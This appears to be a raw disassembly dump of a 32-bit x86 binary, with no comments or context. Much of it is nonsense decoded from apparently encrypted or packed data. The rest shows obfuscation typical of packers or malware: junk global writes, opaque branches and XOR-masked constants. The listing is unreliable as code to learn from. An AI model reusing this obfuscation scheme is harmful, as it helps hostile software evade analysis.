  420b5e:	stos   BYTE PTR es:[edi],al
  420b5f:	sbb    ah,BYTE PTR [eax+esi*1-0x25]
  420b63:	jecxz  0x420b6a
  420b65:	setnp  BYTE PTR [eax+0x5b]
  420b69:	repnz inc ecx
  420b6b:	sbb    eax,0xbf48685f
  420b70:	ss push edx
  420b72:	mov    cl,0xc1
  420b74:	xor    al,0x69
  420b76:	add    eax,DWORD PTR [edi-0x6b]
  420b79:	push   edi
  420b7a:	dec    DWORD PTR [ebx]
  420b7c:	jno    0x420b7d
  420b7e:	aad    0x28
  420b80:	sahf   
  420b81:	(bad)  
  420b82:	(bad)  
  420b83:	neg    BYTE PTR [esi+eax*2-0x43]
  420b87:	repnz lods al,BYTE PTR ds:[esi]
  420b89:	aas    
  420b8a:	jl     0x420b62
  420b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b8d:	mov    ah,0xaa
  420b8f:	jl     0x420b85
  420b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b92:	inc    ecx
  420b93:	out    0xf2,al
  420b95:	adc    eax,0x8af3120d
  420b9a:	cwde   
  420b9b:	inc    ebx
  420b9c:	pop    ebx
  420b9d:	jmp    0x420b5b
  420b9f:	fisubr WORD PTR [ebx]
  420ba1:	test   DWORD PTR [edx+0x1e],edi
  420ba4:	pop    ebx
  420ba5:	sahf   
  420ba6:	jecxz  0x420bb1
  420ba8:	jb     0x420bb6
  420baa:	mov    ah,0x57
  420bac:	dec    ebp
  420bad:	cs jbe 0x420b66
  420bb0:	mov    dh,0x71
  420bb2:	lds    esp,FWORD PTR [edi+0x571a8d73]
  420bb8:	pop    eax
  420bb9:	and    BYTE PTR [ebp+eax*2-0x66c12e93],ch
  420bc0:	xor    DWORD PTR [edx-0x44fb5ef8],ecx
  420bc6:	push   edi
  420bc7:	xchg   ebx,eax
  420bc8:	inc    ecx
  420bc9:	lahf   
  420bca:	or     BYTE PTR [esp+edi*1],ch
  420bcd:	ins    BYTE PTR es:[edi],dx
  420bce:	nop
  420bcf:	jo     0x420bb9
  420bd1:	cmp    esp,DWORD PTR [eax]
  420bd3:	mov    ds:0x679cf8a5,eax
  420bd8:	dec    esp
  420bd9:	mov    edi,0x44254f1
  420bde:	addr16 (bad) 
  420be0:	clc    
  420be1:	stc    
  420be2:	call   0xe36b6ebd
  420be7:	lods   al,BYTE PTR ds:[esi]
  420be8:	loope  0x420bfe
  420bea:	xchg   edx,eax
  420beb:	dec    ebx
  420bec:	push   edi
  420bed:	aas    
  420bee:	push   eax
  420bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bf0:	fidiv  WORD PTR [ecx]
  420bf2:	adc    al,0xf3
  420bf4:	dec    edi
  420bf5:	aad    0xd0
  420bf7:	cli    
  420bf8:	clc    
  420bf9:	cwde   
  420bfa:	adc    eax,0xa6e61ffa
  420bff:	dec    esi
  420c00:	jle    0x420c37
  420c02:	pusha  
  420c03:	push   ebp
  420c04:	into   
  420c05:	dec    esp
  420c06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c07:	xchg   edi,eax
  420c08:	fmulp  st(0),st
  420c0a:	sti    
  420c0b:	out    dx,eax
  420c0c:	les    edi,FWORD PTR [esp+eax*1]
  420c0f:	xor    ecx,DWORD PTR [edi-0x55]
  420c12:	pop    esi
  420c13:	and    BYTE PTR [ebp+0x2c2a0854],bh
  420c19:	stos   DWORD PTR es:[edi],eax
  420c1a:	mov    edx,0xe7deee5b
  420c1f:	test   ebp,0x8d575b9c
  420c25:	retf   0xed77
  420c28:	xchg   ebp,eax
  420c29:	xlat   BYTE PTR ds:[ebx]
  420c2a:	adc    ch,BYTE PTR [esi-0x77]
  420c2d:	adc    al,0xb9
  420c2f:	add    ebp,DWORD PTR [esp+ebp*8+0x70d7621]
  420c36:	fidivr DWORD PTR [eax+0x449a5e81]
  420c3c:	inc    eax
  420c3d:	sbb    esi,0x30
  420c40:	scas   al,BYTE PTR es:[edi]
  420c41:	loopne 0x420c10
  420c43:	or     cl,BYTE PTR [ecx]
  420c45:	stc    
  420c46:	mov    cl,0xca
  420c48:	and    DWORD PTR [edx],ebx
  420c4a:	ret    0x2670
  420c4d:	aam    0xa6
  420c4f:	icebp  
  420c50:	xchg   ecx,eax
  420c51:	xchg   esp,esi
  420c53:	dec    eax
  420c54:	and    DWORD PTR [ecx],ebp
  420c56:	pop    eax
  420c57:	add    bh,cl
  420c59:	arpl   bx,bp
  420c5b:	xor    ebp,DWORD PTR [ebx+0x5d]
  420c5e:	ja     0x420bfe
  420c60:	pusha  
  420c61:	push   cs
  420c62:	out    0x71,eax
  420c64:	xchg   ebx,eax
  420c65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c66:	mov    esi,gs
  420c68:	adc    BYTE PTR [esi-0x359b807e],dl
  420c6e:	(bad)  
  420c6f:	mov    dh,0xb6
  420c71:	xchg   ebp,eax
  420c72:	cs or  edi,edx
  420c75:	ud1    edx,DWORD PTR [ebp-0x3378f662]
  420c7c:	les    esi,FWORD PTR [esi*4-0x581706b7]
  420c83:	inc    esp
  420c84:	test   DWORD PTR [edi],0x72519fa6
  420c8a:	inc    ecx
  420c8b:	jle    0x420c25
  420c8d:	mov    eax,0x2ba5c521
  420c92:	leave  
  420c93:	cmp    BYTE PTR [ecx+0x2ce98143],0x11
  420c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c9b:	mov    ebp,0xafed5a0a
  420ca0:	cmc    
  420ca1:	fld    TBYTE PTR [ecx-0x49]
  420ca4:	mov    dh,0x57
  420ca6:	out    dx,eax
  420ca7:	addr16 inc esi
  420ca9:	xor    al,0x21
  420cab:	fcmovnb st,st(4)
  420cad:	jae    0x420ccd
  420caf:	lahf   
  420cb0:	pop    es
  420cb1:	sbb    eax,0xeaed79d
  420cb6:	sub    al,0x21
  420cb8:	and    bh,dl
  420cba:	std    
  420cbb:	mov    DWORD PTR [edx-0x53],ebx
  420cbe:	pusha  
  420cbf:	cmp    edx,DWORD PTR [ebx+0x44]
  420cc2:	or     al,0xd3
  420cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cc5:	mov    ebp,eax
  420cc7:	dec    edi
  420cc8:	hlt    
  420cc9:	pop    ebx
  420cca:	es inc esi
  420ccc:	or     al,0x13
  420cce:	cdq    
  420ccf:	xchg   esi,eax
  420cd0:	cld    
  420cd1:	addr16 push ds
  420cd3:	mov    al,0xaa
  420cd5:	ret    0xd112
  420cd8:	pop    edx
  420cd9:	xchg   edx,eax
  420cda:	mov    ebp,0xc353a16d
  420cdf:	leave  
  420ce0:	add    al,0xb4
  420ce2:	lods   eax,DWORD PTR ds:[esi]
  420ce3:	out    dx,eax
  420ce4:	std    
  420ce5:	xchg   edx,eax
  420ce6:	cmc    
  420ce7:	test   DWORD PTR ds:0xc7175488,edx
  420ced:	and    eax,0x2d7e37de
  420cf2:	mul    DWORD PTR [edi]
  420cf4:	dec    edi
  420cf5:	mov    ah,0x95
  420cf7:	clc    
  420cf8:	mov    dh,0x12
  420cfa:	or     edi,eax
  420cfc:	jmp    0x420c83
  420cfe:	int    0xc4
  420d00:	fstp   DWORD PTR [edx]
  420d02:	jns    0x420d02
  420d04:	mov    dh,0xe9
  420d06:	fdivr  QWORD PTR [ecx+ebp*8]
  420d09:	pop    eax
  420d0a:	dec    ebp
  420d0b:	stos   DWORD PTR es:[edi],eax
  420d0c:	pop    eax
  420d0d:	mov    WORD PTR [esi],ss
  420d0f:	stos   BYTE PTR es:[edi],al
  420d10:	test   al,0x1f
  420d12:	inc    ebx
  420d13:	sub    DWORD PTR [esi],ecx
  420d15:	and    ebp,ebp
  420d17:	or     BYTE PTR [edx-0x2a],dl
  420d1a:	push   ss
  420d1b:	pop    ss
  420d1c:	add    dh,BYTE PTR [edi+0x5d]
  420d1f:	bound  esi,QWORD PTR [eax]
  420d21:	test   DWORD PTR [edi-0x613cf9ef],ebx
  420d27:	add    al,dh
  420d29:	sti    
  420d2a:	sbb    bl,bh
  420d2c:	leave  
  420d2d:	xchg   ecx,eax
  420d2e:	enter  0x81d8,0xac
  420d32:	stos   DWORD PTR es:[edi],eax
  420d33:	pop    es
  420d34:	test   DWORD PTR [edx+ebx*8],0x1a7c7ef4
  420d3b:	add    ebp,DWORD PTR [ecx+0x235abd3]
  420d41:	dec    edi
  420d42:	aaa    
  420d43:	sbb    BYTE PTR [edx-0x39e35a52],ch
  420d49:	cmp    BYTE PTR [eax],dl
  420d4b:	sbb    esp,DWORD PTR [eax-0x6]
  420d4e:	mov    edx,0x8d034c4
  420d53:	ss ret 0xe0bb
  420d57:	adc    bh,0x59
  420d5a:	jae    0x420d46
  420d5c:	pop    esp
  420d5d:	xchg   edi,eax
  420d5e:	mov    bl,0x72
  420d60:	mov    ebx,0x8dc07eac
  420d65:	xchg   edi,eax
  420d66:	mul    BYTE PTR [eax-0x6be2b71e]
  420d6c:	mov    ecx,0xe56f6853
  420d71:	adc    eax,0x50c5bc1f
  420d76:	sahf   
  420d77:	adc    ch,bl
  420d79:	add    esi,DWORD PTR [eax+0x4d]
  420d7c:	js     0x420d71
  420d7e:	or     BYTE PTR ds:0xe58e4b52,0xaa
  420d85:	xor    BYTE PTR [ebp+ebx*4+0x4baa5081],al
  420d8c:	bswap  ecx
  420d8e:	inc    esp
  420d8f:	sbb    bh,BYTE PTR [edi-0x4c5d85c8]
  420d95:	arpl   WORD PTR ds:0xf1f696d6,bp
  420d9b:	pop    ebp
  420d9c:	xor    eax,0x7ebe4f50
  420da1:	xor    DWORD PTR [eax+0x7f29b3ec],edx
  420da7:	jmp    0x420d42
  420da9:	lock pop ds
  420dab:	ficomp DWORD PTR [ecx+0x44]
  420dae:	sbb    dh,BYTE PTR [ebp+eax*8-0x4095d37c]
  420db5:	sbb    al,0xdb
  420db7:	fiadd  WORD PTR [eax]
  420db9:	adc    eax,0xce0d73e5
  420dbe:	pop    ebx
  420dbf:	ss ret 
  420dc1:	cmp    BYTE PTR [eax-0x47f79737],ch
  420dc7:	out    dx,al
  420dc8:	mul    BYTE PTR [esi]
  420dca:	cmp    eax,0x7daaaab1
  420dcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dd0:	fucomi st,st(4)
  420dd2:	cbw    
  420dd4:	push   edi
  420dd5:	call   DWORD PTR [edx+0x3f]
  420dd8:	dec    eax
  420dd9:	add    eax,0x3bd2901d
  420dde:	add    al,0x3a
  420de0:	cld    
  420de1:	jge    0x420e38
  420de3:	mov    WORD PTR [eax-0x70],ss
  420de6:	lahf   
  420de7:	xchg   esi,eax
  420de8:	xor    eax,0x960b2910
  420ded:	add    bh,BYTE PTR [ecx+0x35dc2f3b]
  420df3:	push   ss
  420df4:	call   0x88e0:0x3ab47772
  420dfb:	xchg   ebx,eax
  420dfc:	pushf  
  420dfd:	enter  0x18f6,0x5b
  420e01:	imul   ecx,esp,0xd87749be
  420e07:	xchg   esp,eax
  420e08:	(bad)  
  420e09:	bound  eax,QWORD PTR es:[ecx]
  420e0c:	fdivr  st(4),st
  420e0e:	cld    
  420e0f:	mov    bl,BYTE PTR [eax-0x6a7aac37]
  420e15:	and    bh,bh
  420e17:	sbb    edi,DWORD PTR [ecx-0x4b]
  420e1a:	aam    0xe8
  420e1c:	sub    DWORD PTR [eax+0x42],edx
  420e1f:	push   edx
  420e20:	mov    bh,0x4b
  420e22:	xor    al,0x7b
  420e24:	dec    edx
  420e25:	xchg   edx,eax
  420e26:	push   es
  420e27:	xchg   esi,eax
  420e28:	(bad)  
  420e29:	enter  0x64a,0x3e
  420e2d:	mov    ecx,0x3fcb3ffc
  420e32:	push   esi
  420e33:	mov    al,ds:0xea9cbfb4
  420e38:	in     al,dx
  420e39:	(bad)  
  420e3a:	in     al,dx
  420e3b:	mov    ah,al
  420e3d:	add    al,0x6
  420e3f:	lock add al,BYTE PTR [ecx+0x70]
  420e43:	je     0x420eb4
  420e45:	shl    BYTE PTR [ecx],cl
  420e47:	mov    dh,0xa4
  420e49:	push   cs
  420e4a:	daa    
  420e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e4c:	or     al,0x26
  420e4e:	pop    ss
  420e4f:	popf   
  420e50:	and    ebp,ebp
  420e52:	sbb    eax,0xb5b0a3ec
  420e57:	add    BYTE PTR [ecx+0x29adea],0x0
  420e5e:	mov    esi,DWORD PTR ds:0x4281db
  420e64:	sbb    DWORD PTR ds:0x4283cf,esi
  420e6a:	imul   edx,eax
  420e6d:	cmp    DWORD PTR ds:0x4283eb,0x0
  420e74:	mov    DWORD PTR ds:0x4282a3,ebx
  420e7a:	mov    DWORD PTR ds:0x4281db,0x153
  420e84:	jmp    0x420efa
  420e89:	mov    eax,ds:0x4281cf
  420e8e:	mov    DWORD PTR ds:0x4282b3,0x776f
  420e98:	cmp    DWORD PTR ds:0x4283eb,0x0
  420e9f:	jle    0x420ecd
  420ea5:	push   0x428287
  420eaa:	push   0x4280ef
  420eaf:	call   DWORD PTR ds:0x428ea8
  420eb5:	add    ecx,DWORD PTR ds:0x4283e7
  420ebb:	xor    esi,DWORD PTR ds:0x42827f
  420ec1:	adc    DWORD PTR ds:0x4282d7,edx
  420ec7:	xor    DWORD PTR ds:0x42835f,edx
  420ecd:	mov    esi,DWORD PTR ds:0x42828b
  420ed3:	or     esi,DWORD PTR ds:0x4281e7
  420ed9:	mov    DWORD PTR ds:0x42828b,esi
  420edf:	and    ecx,ecx
  420ee1:	neg    DWORD PTR ds:0x4282bf
  420ee7:	dec    ecx
  420ee8:	movzx  eax,WORD PTR ds:0x4281a7
  420eef:	sbb    eax,DWORD PTR ds:0x42835b
  420ef5:	mov    ds:0x4281a7,eax
  420efa:	mov    eax,DWORD PTR [ebp-0x90]
  420f00:	xor    esi,esi
  420f02:	add    esi,DWORD PTR ds:0x428257
  420f08:	xor    ecx,ecx
  420f0a:	add    ecx,DWORD PTR ds:0x4283af
  420f10:	sub    ecx,esi
  420f12:	xor    esi,DWORD PTR [esi+ecx*1]
  420f15:	lea    eax,[eax+edx*1+0x14f2e240]
  420f1c:	cmp    DWORD PTR ds:0x42835f,0x0
  420f23:	mov    DWORD PTR ds:0x4282f3,0x1362
  420f2d:	mov    DWORD PTR ds:0x4282a3,edx
  420f33:	mov    DWORD PTR ds:0x4282df,edi
  420f39:	jmp    0x421029
  420f3e:	mov    DWORD PTR ds:0x4283c3,0xeb5
  420f48:	cmp    DWORD PTR ds:0x42835f,0x0
  420f4f:	ja     0x420f81
  420f55:	push   DWORD PTR [ebp-0x24]
  420f58:	push   DWORD PTR [ebp-0x14]
  420f5b:	push   DWORD PTR [ebp-0x14]
  420f5e:	call   DWORD PTR ds:0x428f20
  420f64:	neg    ecx
  420f66:	xor    esi,esi
  420f68:	or     esi,DWORD PTR ds:0x42822f
  420f6e:	xor    edx,edx
  420f70:	add    edx,DWORD PTR ds:0x42823b
  420f76:	sub    edx,esi
  420f78:	or     esi,DWORD PTR [esi+edx*1]
  420f7b:	sub    DWORD PTR ds:0x4282b7,ecx
  420f81:	mov    edx,DWORD PTR ds:0x4282af
  420f87:	sbb    edx,DWORD PTR ds:0x4283f7
  420f8d:	mov    DWORD PTR ds:0x4282af,edx
  420f93:	add    DWORD PTR ds:0x4281eb,ecx
  420f99:	sub    DWORD PTR ds:0x4283db,0x42834b
  420fa3:	cmp    DWORD PTR ds:0x4282d7,0x0
  420faa:	mov    ecx,DWORD PTR ds:0x4283bb
  420fb0:	movzx  edx,BYTE PTR ds:0x4281c3
  420fb7:	mov    DWORD PTR ds:0x428347,0x5580
  420fc1:	mov    DWORD PTR ds:0x4283f3,edi
  420fc7:	jmp    0x421029
  420fcc:	mov    DWORD PTR ds:0x4283f7,0x673a
  420fd6:	cmp    DWORD PTR ds:0x4282d7,0x0
  420fdd:	jle    0x420ffa
  420fe3:	push   DWORD PTR [ebp-0x20]
  420fe6:	call   DWORD PTR ds:0x428dc4
  420fec:	xor    esi,edx
  420fee:	add    ecx,0x6ba8
  420ff4:	xor    edx,0x4b1f
  420ffa:	mov    edx,DWORD PTR ds:0x428357
  421000:	sbb    DWORD PTR ds:0x4282d3,edx
  421006:	movzx  edx,WORD PTR ds:0x4281ab
  42100d:	or     edx,DWORD PTR ds:0x4283d3
  421013:	mov    DWORD PTR ds:0x4281ab,edx
  421019:	dec    DWORD PTR ds:0x4283c3
  42101f:	sub    DWORD PTR ds:0x4282cf,0x689b
  421029:	mov    DWORD PTR [ebp-0x174],eax
  42102f:	mov    eax,DWORD PTR [ebp-0x24]
  421032:	mov    ecx,DWORD PTR [ebp-0x94]
  421038:	add    esi,edx
  42103a:	mov    edx,DWORD PTR [ebp-0x10]
  42103d:	neg    esi
  42103f:	xor    edx,ecx
  421041:	cmp    DWORD PTR ds:0x4281bb,0x0
  421048:	mov    DWORD PTR ds:0x4283c7,0x62d9
  421052:	mov    DWORD PTR ds:0x4281a7,0x300d
  42105c:	mov    DWORD PTR ds:0x4281ab,0x20bd
  421066:	mov    ecx,DWORD PTR ds:0x42834f
  42106c:	jmp    0x4210b5
  421071:	mov    DWORD PTR ds:0x4283bf,0x134d
  42107b:	cmp    DWORD PTR ds:0x4281bb,0x0
  421082:	jae    0x4210a9
  421088:	push   DWORD PTR [ebp-0xc]
  42108b:	push   0x4ac4
  421090:	push   DWORD PTR [ebp-0x24]
  421093:	push   0x863f
  421098:	push   DWORD PTR [ebp-0x28]
  42109b:	call   DWORD PTR ds:0x428de4
  4210a1:	sbb    ecx,DWORD PTR ds:0x4282d3
  4210a7:	adc    esi,esi
  4210a9:	and    DWORD PTR ds:0x4282f7,edi
  4210af:	sbb    ecx,DWORD PTR ds:0x4281b3
  4210b5:	add    edx,DWORD PTR [ebp-0x78]
  4210b8:	mov    ecx,DWORD PTR [ebp-0xc0]
  4210be:	lea    ecx,[edx+ecx*1+0x6ac1]
  4210c5:	and    ecx,eax
  4210c7:	mov    eax,0x1101
  4210cc:	sub    eax,ecx
  4210ce:	add    eax,DWORD PTR [ebp+0x8]
  4210d1:	mov    DWORD PTR [ebp-0x170],eax
  4210d7:	mov    DWORD PTR [ebp-0x15c],0xca79a575
  4210e1:	mov    DWORD PTR [ebp-0x158],0x9c1b89e8
  4210eb:	mov    DWORD PTR [ebp-0x154],0xca79a571
  4210f5:	mov    DWORD PTR [ebp-0x150],0x9c1b89e8
  4210ff:	mov    esi,DWORD PTR [ebp-0x174]
  421105:	mov    eax,DWORD PTR [ebp-0x154]
  42110b:	mov    edx,DWORD PTR [ebp-0x150]
  421111:	xor    eax,0xca79a575
  421116:	xor    edx,0x9c1b89e8
  42111c:	mov    cl,0x2
  42111e:	call   0x40a9b5
  421123:	mov    edi,eax
  421125:	mov    ebx,edx
  421127:	mov    eax,DWORD PTR [ebp-0x154]
  42112d:	mov    edx,DWORD PTR [ebp-0x150]
  421133:	xor    eax,0xca79a575
  421138:	xor    edx,0x9c1b89e8
  42113e:	mov    cl,0x3e
  421140:	call   0x42227f
  421145:	or     edi,eax
  421147:	or     ebx,edx
  421149:	jmp    0x4213c2
  42114e:	test   al,0x92
  421150:	fdivr  st,st(3)
  421152:	and    bh,BYTE PTR [edx]
  421154:	call   0x81bc:0x65828d2a
  42115b:	and    BYTE PTR [ebx-0x50],ch
  42115e:	ror    DWORD PTR [edi],0x16
  421161:	sbb    BYTE PTR [ecx+0x14],ch
  421164:	sbb    BYTE PTR [eax],bl
  421166:	loopne 0x4211a3
  421168:	addr16 das 
  42116a:	inc    edx
  42116b:	pop    ebx
  42116c:	loopne 0x42116e
  42116e:	popa   
  42116f:	fwait
  421170:	in     eax,dx
  421171:	sbb    eax,0x8c606dc7
  421176:	sub    BYTE PTR [esp+ebp*1-0x76aa5821],al
  42117d:	clc    
  42117e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42117f:	mov    ebp,DWORD PTR [esi-0xffef007]
  421185:	push   ss
  421186:	jmp    0xd007:0x9ffda7af
  42118d:	pop    ss
  42118e:	cdq    
  42118f:	cdq    
  421190:	in     al,0x99
  421192:	mov    BYTE PTR [edi-0x59688bb5],al
  421198:	sbb    al,0x8c
  42119a:	add    al,BYTE PTR [edx]
  42119c:	push   esi
  42119d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42119e:	mov    ah,0xf0
  4211a0:	les    eax,FWORD PTR [ebx+ecx*2-0x4d]
  4211a4:	pushf  
  4211a5:	mul    DWORD PTR [ecx-0x54]
  4211a8:	retf   
  4211a9:	push   cs
  4211aa:	and    DWORD PTR [ebx-0x4a8b75b7],esp
  4211b0:	clc    
  4211b1:	jbe    0x42118e
  4211b3:	(bad)  
  4211b4:	ret    
  4211b5:	lods   eax,DWORD PTR ds:[esi]
  4211b6:	pop    edi
  4211b7:	dec    ecx
  4211b8:	lods   al,BYTE PTR ds:[esi]
  4211b9:	(bad)  [esi]
  4211bb:	fidivr WORD PTR [edi-0x68]
  4211be:	push   0x24
  4211c0:	xchg   esp,eax
  4211c1:	and    eax,0x7dfed904
  4211c6:	fsubr  DWORD PTR [ebp+0x66]
  4211c9:	arpl   WORD PTR [edx],bx
  4211cb:	mov    bl,BYTE PTR [ecx+0xdadc861]
  4211d1:	mov    ah,0x63
  4211d3:	adc    al,ah
  4211d5:	mov    edi,0x4ab242e0
  4211da:	retf   0x4770
  4211dd:	inc    eax
  4211de:	ss shl eax,1
  4211e1:	xchg   DWORD PTR [esi+esi*1],esp
  4211e4:	(bad)  
  4211e5:	shr    BYTE PTR [ebx-0x5c6e64dd],1
  4211eb:	test   DWORD PTR [edx],0x61d0a8cb
  4211f1:	and    BYTE PTR [ecx],dl
  4211f3:	pushf  
  4211f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211f5:	ret    
  4211f6:	sbb    eax,0xcdfa7c3a
  4211fb:	call   0x13ada509
  421200:	xchg   BYTE PTR [ebx],dl
  421202:	inc    ecx
  421203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421204:	inc    ebx
  421205:	push   ebx
  421206:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421207:	mov    ah,0xf7
  421209:	stos   BYTE PTR es:[edi],al
  42120a:	xor    DWORD PTR [eax],edx
  42120c:	pop    ss
  42120d:	xchg   esp,eax
  42120e:	and    DWORD PTR [ecx+0x4b],edi
  421211:	sbb    esi,0x3b87500d
  421217:	pushf  
  421218:	pop    ebx
  421219:	xchg   BYTE PTR [eax-0x30710b0b],bl
  42121f:	les    ebx,FWORD PTR [eax-0x48]
  421222:	jmp    0x5153:0xd829fe
  421229:	rol    BYTE PTR [ecx+0x22],0x6b
  42122d:	shl    BYTE PTR [ebp+0x7d157686],cl
  421233:	cmp    dl,BYTE PTR [edx+0x51]
  421236:	adc    eax,0xa142f115
  42123b:	mov    al,ds:0x865ce328
  421240:	iret   
  421241:	aaa    
  421242:	sbb    esp,DWORD PTR [esi]
  421244:	mov    eax,0x48660d0c
  421249:	and    al,0xdd
  42124b:	cmp    al,0x9a
  42124d:	fnstcw WORD PTR [edi]
  42124f:	shr    BYTE PTR ds:0x63f2a2cf,cl
  421255:	pushf  
  421256:	call   0xa89a:0x32bfd9a1
  42125d:	cli    
  42125e:	mov    ds:0x12c889a4,eax
  421263:	xchg   edx,eax
  421264:	xor    al,0xce
  421267:	(bad)  
  421269:	bound  ebp,QWORD PTR [edi+0x62]
  42126c:	data16 sub dh,BYTE PTR [ebp+0x9]
  421270:	push   esp
  421271:	les    esi,FWORD PTR [ecx]
  421273:	cmp    BYTE PTR [ebx*8+0x67f02dca],0x1a
  42127b:	fwait
  42127c:	popf   
  42127d:	loop   0x421211
  42127f:	jb     0x42125c
  421281:	(bad)  
  421282:	or     bh,bl
  421284:	arpl   WORD PTR [ecx],bx
  421286:	mov    ebp,0xcb25f0f8
  42128b:	mov    dh,0xfb
  42128d:	ss inc eax
  42128f:	xchg   ebx,eax
  421290:	or     eax,DWORD PTR [ebx-0x7d596d49]
  421296:	add    BYTE PTR [ebp+0x619a3c1b],ah
  42129c:	mov    edx,0x2136e110
  4212a1:	std    
  4212a2:	add    ah,ch
  4212a4:	out    dx,eax
  4212a5:	mov    dl,0x78
  4212a7:	outs   dx,BYTE PTR ds:[esi]
  4212a8:	or     edi,esp
  4212aa:	dec    ecx
  4212ab:	adc    BYTE PTR [edx],0x2c
  4212ae:	mov    dh,0x84
  4212b0:	dec    esp
  4212b1:	rcr    ah,1
  4212b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212b4:	lds    esp,FWORD PTR [ecx+0x3a]
  4212b7:	jno    0x4212db
  4212b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212ba:	xor    bh,BYTE PTR [edi-0x13d4f854]
  4212c0:	stos   BYTE PTR es:[edi],al
  4212c1:	add    edi,0x93854e88
  4212c7:	test   DWORD PTR [ebx],eax
  4212c9:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4212cb:	cmp    cl,BYTE PTR [edx+ebp*2+0x52]
  4212cf:	sub    al,0xb3
  4212d1:	add    ebp,ebx
  4212d3:	stc    
  4212d4:	adc    BYTE PTR [ebx],dl
  4212d6:	out    0xf1,al
  4212d8:	pop    ecx
  4212d9:	dec    ebp
  4212da:	ud1    edi,edx
  4212dd:	std    
  4212de:	outs   dx,DWORD PTR ds:[esi]
  4212df:	imul   ecx,DWORD PTR [esi],0x69df29f0
  4212e5:	mov    ch,0xad
  4212e7:	fldenv [eax+0xfe6ee67]
  4212ed:	shl    DWORD PTR [ecx-0x14589200],0x4f
  4212f4:	jae    0x4212c2
  4212f6:	jns    0x421318
  4212f8:	cmp    eax,0x696a468f
  4212fd:	inc    edx
  4212fe:	stos   DWORD PTR es:[edi],eax
  4212ff:	cmp    edi,DWORD PTR [edi]
  421301:	adc    al,0x9b
  421303:	icebp  
  421304:	aaa    
  421305:	div    BYTE PTR [ebx+0x4f5c5667]
  42130b:	and    dl,BYTE PTR [eax+edi*2]
  42130e:	or     eax,edi
  421310:	pop    edi
  421311:	loope  0x4212db
  421313:	aaa    
  421314:	(bad)  
  421315:	pop    ebp
  421316:	xor    esp,DWORD PTR [eax-0x5a9fd974]
  42131c:	dec    eax
  42131d:	out    dx,al
  42131e:	(bad)  
  42131f:	popa   
  421320:	add    bh,0x2b
  421323:	sub    al,0xe1
  421325:	jb     0x42137f
  421327:	imul   edi,DWORD PTR [edx+0x62],0x2cf01d3
  42132e:	test   BYTE PTR [ecx+0x8e0ad62],0xab
  421335:	pushf  
  421336:	push   esi
  421337:	jbe    0x421364
  421339:	add    dl,BYTE PTR [edx]
  42133b:	imul   edi,DWORD PTR [ecx],0xf
  42133e:	sti    
  42133f:	adc    BYTE PTR [esp+eax*2-0x1b1a153f],bl
  421346:	add    dl,dh
  421348:	push   cs
  421349:	cld    
  42134a:	cdq    
  42134b:	out    dx,eax
  42134c:	cli    
  42134d:	stos   BYTE PTR es:[edi],al
  42134e:	pop    eax
  42134f:	mov    ch,0x75
  421351:	pop    eax
  421352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421353:	das    
  421354:	inc    esp
  421355:	mov    al,ds:0x2f0f0b1
  42135a:	jmp    0x42131e
  42135c:	(bad)
  42135f:	pop    ds
  421360:	sbb    edx,ecx
  421362:	clc    
  421363:	outs   dx,BYTE PTR ds:[esi]
  421364:	les    ecx,FWORD PTR [ecx+0x9]
  421367:	test   DWORD PTR [ecx],eax
  421369:	das    
  42136a:	(bad)  
  42136c:	retf   
  42136d:	xchg   DWORD PTR [edx+0x5],ecx
  421370:	bound  si,DWORD PTR [edi]
  421373:	mov    ecx,0x476e51ec
  421378:	into   
  421379:	mov    es,WORD PTR ds:0xd5bda322
  42137f:	pop    edx
  421380:	in     al,0xd4
  421382:	int    0xee
  421384:	test   al,0xb9
  421386:	fmul   QWORD PTR [esi-0x14]
  421389:	mov    bl,0xe6
  42138b:	test   DWORD PTR [esi+0x432aa8a3],0xf8756a07
  421395:	imul   DWORD PTR [eax-0x4930d670]
  42139b:	pop    esp
  42139c:	int3   
  42139d:	mov    eax,0x4144f6af
  4213a2:	ret    
  4213a3:	cmp    al,BYTE PTR [esi+0x3b]
  4213a6:	mov    edx,0x5d2ebb96
  4213ab:	add    edi,eax
  4213ad:	ficomp DWORD PTR [ebp+0x3b]
  4213b0:	sbb    esi,esi
  4213b2:	retf   0x4155
  4213b5:	lods   eax,DWORD PTR ds:[esi]
  4213b6:	sbb    al,al
  4213b8:	jae    0x421375
  4213ba:	xor    ecx,DWORD PTR [ecx-0x4b]
  4213bd:	jno    0x421412
  4213bf:	rcr    BYTE PTR [ecx+0x69],1
  4213c2:	mov    eax,DWORD PTR [ebp-0x15c]
  4213c8:	mov    edx,DWORD PTR [ebp-0x158]
  4213ce:	xor    eax,0xca79a575
  4213d3:	xor    edx,0x9c1b89e8
  4213d9:	mov    cl,0x2
  4213db:	call   0x40a9b5
  4213e0:	mov    ecx,edx
  4213e2:	mov    edx,DWORD PTR [ebp-0x15c]
  4213e8:	mov    DWORD PTR [ebp-0x218],esi
  4213ee:	mov    esi,DWORD PTR [ebp-0x158]
  4213f4:	xor    edx,0xca79a575
  4213fa:	xor    esi,0x9c1b89e8
  421400:	mov    DWORD PTR [ebp-0x21c],eax
  421406:	mov    eax,edx
  421408:	mov    edx,esi
  42140a:	mov    DWORD PTR [ebp-0x220],ecx
  421410:	mov    cl,0x3e
  421412:	call   0x42227f
  421417:	mov    esi,DWORD PTR [ebp-0x21c]
  42141d:	or     esi,eax
  42141f:	mov    eax,DWORD PTR [ebp-0x220]
  421425:	or     eax,edx
  421427:	push   eax
  421428:	push   esi
  421429:	push   ebx
